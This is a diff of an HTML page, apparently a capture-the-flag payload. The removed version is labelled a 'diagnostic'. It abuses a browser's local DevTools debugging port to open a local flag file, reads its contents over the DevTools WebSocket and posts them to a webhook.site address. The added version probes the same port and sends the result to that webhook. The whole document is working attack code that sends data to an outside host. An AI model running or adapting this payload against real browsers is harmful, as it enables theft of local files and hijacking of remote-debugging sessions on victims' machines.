@@ -1,92 +1,23 @@
 <!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <title>Cancri-SP diagnostic</title>
-</head>
-<body>
-<pre id="status">Running...</pre>
-
+<meta charset="utf-8">
+<pre id="out">Testing browser...</pre>
 <script>
 (async () => {
-  const hook =
-    "https://webhook.site/a66ae4f5-fdf1-46dd-acff-05d5c108df64";
+  const hook = "https://webhook.site/a66ae4f5-fdf1-46dd-acff-05d5c108df64";
 
-  async function report(message) {
-    document.getElementById("status").textContent = message;
-
+  async function report(x) {
+    document.getElementById("out").textContent = x;
     try {
-      await fetch(hook, {
-        method: "POST",
-        mode: "no-cors",
-        body: String(message)
-      });
-    } catch (e) {
-      console.error(e);
-    }
+      await fetch(hook, {method:"POST", mode:"no-cors", body:x});
+    } catch(e) {}
   }
 
-  let ws;
-
   try {
-    const response = await fetch(
-      "http://localhost:9222/json/new?file:///challenge/flag-53035d3cba0664dfac37ff64b6e0f86e",
-      { method: "PUT" }
-    );
-
-    if (!response.ok) {
-      throw new Error("DevTools HTTP " + response.status);
-    }
-
-    const page = await response.json();
-
-    if (!page.webSocketDebuggerUrl) {
-      throw new Error("Missing WebSocket URL");
-    }
-
-    ws = new WebSocket(page.webSocketDebuggerUrl);
-
-    ws.onopen = async () => {
-      await new Promise(resolve => setTimeout(resolve, 500));
-
-      ws.send(JSON.stringify({
-        id: 1,
-        method: "Runtime.evaluate",
-        params: {
-          expression: "document.body.innerHTML",
-          returnByValue: true
-        }
-      }));
-    };
-
-    ws.onmessage = async event => {
-      const message = JSON.parse(event.data);
-
-      if (message.id === 1) {
-        await report(
-          "Page content: " +
-          JSON.stringify(
-            message.result?.result?.value ??
-            message.result?.exceptionDetails ??
-            message
-          )
-        );
-
-        ws.close();
-      }
-    };
-
-    ws.onerror = () => {
-      report("DevTools WebSocket failed");
-    };
-
-  } catch (error) {
-    await report("Diagnostic error: " + String(error));
-    if (ws) ws.close();
+    const r = await fetch("http://localhost:9222/json/version");
+    const t = await r.text();
+    await report("DEBUG_ENDPOINT: " + t);
+  } catch(e) {
+    await report("DEBUG_ENDPOINT_ERROR: " + String(e));
   }
 })();
 </script>
-</body>
-</html>
-
-
